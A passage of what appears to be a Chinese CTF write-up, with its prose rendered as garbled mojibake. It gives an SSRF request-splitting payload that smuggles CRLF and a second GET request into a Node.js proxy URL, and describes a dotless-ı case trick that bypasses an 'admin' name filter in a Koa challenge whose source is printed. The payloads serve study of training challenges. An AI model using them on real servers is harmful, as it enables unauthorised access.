&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendStatus&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">404&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>çªç ´å£åœ¨å®ƒä½¿ç”¨çš„Node.jsçš„ç‰ˆæœ¬æ°å¥½æœ‰ä¸Šè¿°SSRFçš„é—®é¢˜&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setHeader&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;X-Node-js-Version&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;v8.12.0&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setHeader&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;X-Express-Version&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;v4.16.3&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…¥æ‰‹ç‚¹çš„ä»£ç ä»£ç å°±æ˜¯è¿™é‡Œäº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205210752342.png" alt="image-20211205210752342">&lt;/p>
&lt;p>ç°åœ¨å°±è¯´æƒ³åŠæ³•ç»•è¿‡ç™½åå•çš„å®¡æŸ¥å¹¶æ„é€ payloadï¼›æˆ‘ä»¬éœ€è¦ç¬¬ä¸€ä¸ªè¯·æ±‚æŒ‡å‘&lt;code>/proxy/internal_website/public_notes&lt;/code>ï¼Œç¬¬äºŒä¸ªè¯·æ±‚æŒ‡å‘&lt;code>/flag/amiz&lt;/code>ï¼Œè®©flagå­˜åœ¨&lt;code>public/temp/md5(127.0.0.1amiz)&lt;/code>è·¯å¾„ä¸‹&lt;/p>
&lt;pre tabindex="0">&lt;code>public_notes\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0166}\u{016c}\u{0161}\u{0167}/amiz
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>/proxy/internal_website/public_notes%C4%A0HTTP%2F1.1%C4%8D%C4%8AHost%3A%C4%A0127.0.0.1%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0%2F%C5%A6%C5%AC%C5%A1%C5%A7%2Famiz
&lt;/code>&lt;/pre>&lt;h2 id="å®‰æ´µæ¯-2019membershop">[å®‰æ´µæ¯ 2019]Membershop&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206224942653.png" alt="image-20211206224942653">&lt;/p>
&lt;p>adminä¼šè¢«è¿‡æ»¤ï¼Œé‚£å°±å…ˆç®€å•ç™»å…¥&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206225301864.png" alt="image-20211206225301864">&lt;/p>
&lt;p>æŠ“åŒ…åé€šè¿‡sessionå¯ä»¥çœ‹å‡ºæ˜¯koaæ¡†æ¶&lt;/p>
&lt;p>è¿™é‡Œå‡ºé¢˜äººè¯´å¾ˆå®¹æ˜“è”æƒ³åˆ°åç«¯ä½¿ç”¨&lt;code>toUpperCase()&lt;/code>çš„è½¬æ¢ï¼Œç”¨æ‹‰ä¸æ–‡è¶Šæƒç™»å½•&lt;code>admÄ±n&lt;/code>ï¼Œä¹‹å‰ä¹Ÿæœ‰ä¸€æ¬¡åšé¢˜ç”¨åˆ°è¿™ä¸ªç‚¹äº†ï¼Œä½†æ˜¯åœ¨è¿™é‡Œæ²¡æœ‰æƒ³èµ·æ¥ï¼Œæˆ‘çš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206225648044.png" alt="image-20211206225648044">&lt;/p>
&lt;p>è¿™ä¸‹å¯ä»¥çœ‹æºç äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">Koa&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">router&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa-router&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa-session&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">bodyParser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa-bodyparser&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">isString&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;underscore&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">isString&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">views&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa-views&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;path&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa-static&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">http&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fs&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">md5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;md5&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">qs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;qs&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Koa&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">home&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">router&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">CONFIG&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;koa:sess&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">maxAge&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1800000&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">overwrite&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">httpOnly&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">signed&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">rolling&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">renew&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">checkUser&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/admin/i&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/admin/i&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">undefined&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">checkUrl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">indexOf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">server_ip&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;:3000/query&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">indexOf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;save&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;errorurl&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">WriteResults&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">filePath&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">sandbox&lt;/span> &lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39;/results.txt&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Promise&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resolve&lt;/span> &lt;span style="color:#111">=&amp;gt;{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">appendFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">filePath&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;å†™å…¥æˆåŠŸ&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">resolve&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">filePath&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">DeleteResults&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">filePath&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39;/results.txt&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">unlink&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">filePath&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;åˆ é™¤æ–‡ä»¶æˆåŠŸ&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/query&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">param&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">param&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/&amp;amp;/g&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;amp;amp;&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/&amp;lt;/g&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;amp;lt;&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/&amp;gt;/g&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">status&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;missing parameter:param&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/request&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
